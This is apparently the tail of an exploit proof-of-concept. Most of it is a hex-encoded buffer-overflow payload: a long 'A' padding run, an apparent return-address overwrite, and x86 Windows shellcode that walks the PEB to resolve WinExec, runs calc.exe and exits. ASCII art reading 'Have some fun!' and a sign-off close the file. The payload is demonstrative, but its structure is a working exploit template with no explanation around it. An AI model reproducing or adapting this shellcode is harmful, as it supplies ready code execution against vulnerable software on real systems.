41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:c5:22:02:10:89:e5:83:ec:20:31:db:64:8b:5b:30:8b:5b:0c:8b:5b:1c:8b:1b:8b:1b:8b:43:08:89:45:fc:8b:58:3c:01:c3:8b:5b:78:01:c3:8b:7b:20:01:c7:89:7d:f8:8b:4b:24:01:c1:89:4d:f4:8b:53:1c:01:c2:89:55:f0:8b:53:14:89:55:ec:eb:32:31:c0:8b:55:ec:8b:7d:f8:8b:75:18:31:c9:fc:8b:3c:87:03:7d:fc:66:83:c1:08:f3:a6:74:05:40:39:d0:72:e4:8b:4d:f4:8b:55:f0:66:8b:04:41:8b:04:82:03:45:fc:c3:ba:78:78:65:63:c1:ea:08:52:68:57:69:6e:45:89:65:18:e8:b8:ff:ff:ff:31:c9:51:68:2e:65:78:65:68:63:61:6c:63:89:e3:41:51:53:ff:d0:31:c9:b9:01:65:73:73:c1:e9:08:51:68:50:72:6f:63:68:45:78:69:74:89:65:18:e8:87:ff:ff:ff:31:d2:52:ff:d0
  ___ ___                                                       ___             __ 
 |   Y   .---.-.--.--.-----.   .-----.-----.--------.-----.   .'  _.--.--.-----|  |
 |.  1   |  _  |  |  |  -__|   |__ --|  _  |        |  -__|   |   _|  |  |     |__|
 |.  _   |___._|\___/|_____|   |_____|_____|__|__|__|_____|   |__| |_____|__|__|__|
 |:  |   |                                                                         
 |::.|:. |                                                                         
 `--- ---'                                                                         
                                                                         
```
That´s all folks
---